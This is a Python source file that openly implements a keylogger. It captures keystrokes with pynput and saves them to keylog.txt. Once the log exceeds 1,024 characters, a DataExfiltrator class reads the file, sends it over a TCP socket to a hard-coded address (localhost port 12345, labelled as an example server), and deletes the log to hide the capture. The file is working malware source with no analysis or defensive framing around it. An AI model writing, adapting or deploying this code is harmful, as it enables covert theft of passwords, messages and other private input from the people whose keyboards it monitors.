import socket

from pynput import keyboard
import os
IGNORE_KEYS = {keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.shift_l, keyboard.Key.ctrl, keyboard.Key.ctrl_r, keyboard.Key.ctrl_l, keyboard.Key.alt, keyboard.Key.alt_r, keyboard.Key.alt_l, keyboard.Key.caps_lock, keyboard.Key.cmd}

class KeyLogger:
    def __init__(self):
        self.log = ""
    
    def on_press(self, key):
        if key in IGNORE_KEYS:
            return
        try:
            self.log += key.char
            

        except AttributeError:
            self.log += f" [{key.name}] "
        self.save_log()
    def start(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()
    
    def save_log(self, file_path="keylog.txt"):
        with open(file_path, "w") as log_file:
            log_file.write(self.log)
        if len(self.log) > 1024:  # Example threshold for exfiltration
            self.exfiltrate_log()
            self.log = ""

    def exfiltrate_log(self):
        exfiltrator = DataExfiltrator()
        exfiltrator.run()

class DataExfiltrator:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
    
    def exfiltrate(self):
        if os.path.exists(self.log_file):
            with open(self.log_file, "r") as file:
                data = file.read()
                self.socket_send(data)
        else:
            print("Log file not found.")
    
    def socket_send(self, data):
        # Simulate sending data to a remote server
        asocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            asocket.connect(("127.0.0.1", 12345))  # Example server address and port
            asocket.send(data.encode())
        except Exception as e:
            print(f"Error sending data: {e}")
        finally:
            asocket.close()
    def delete_log(self):
        if os.path.exists(self.log_file):
            os.remove(self.log_file)
    def run(self):
        self.exfiltrate()
        self.delete_log()


if __name__ == "__main__":
    keylogger = KeyLogger()
    keylogger.start()
